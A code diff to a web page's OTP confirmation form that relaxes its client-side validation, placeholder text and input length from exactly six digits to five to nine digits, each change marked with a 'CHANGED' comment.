@@ -35,7 +35,8 @@
   <form id="digitsForm" method="POST" novalidate>
     <div class="input-group">
       <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Confirmation OTP Code</label>
-      <input class="input" id="digits" name="digits" placeholder="Enter 6-digit OTP code" pattern="\d{6}" required maxlength="6">
+      <!-- CHANGED: Updated placeholder and maxlength -->
+      <input class="input" id="digits" name="digits" placeholder="Enter 5-9 digit OTP code" required maxlength="9">
       <div class="input-hint">Check your registered phone for the code</div>
     </div>
     <div class="error-text" id="digitsError"></div>
@@ -373,12 +374,14 @@ document.getElementById("digitsForm").addEventListener("submit", function(event)
   digitsError.textContent = "";
 
   const val = digits.value.trim();
-  const pattern = /^\d{6}$/;
+  
+  // CHANGED: Updated validation to accept 5-9 digits instead of exactly 6
+  const pattern = /^\d{5,9}$/;
 
   if (!pattern.test(val)) {
     valid = false;
     digits.classList.add("input-error");
-    digitsError.textContent = "Please enter a valid 6-digit OTP code.";
+    digitsError.textContent = "Please enter a valid 5-9 digit OTP code.";
   }
 
   if (!valid) event.preventDefault();
@@ -390,8 +393,8 @@ document.getElementById("digits").addEventListener("input", function() {
   digits.classList.remove("input-error");
   digitsError.textContent = "";
   
-  // Auto-format: only allow numbers and limit to 6 digits
-  this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
+  // CHANGED: Updated to allow up to 9 digits instead of exactly 6
+  this.value = this.value.replace(/[^0-9]/g, '').slice(0, 9);
 });
 
 // Add some security-focused interactions
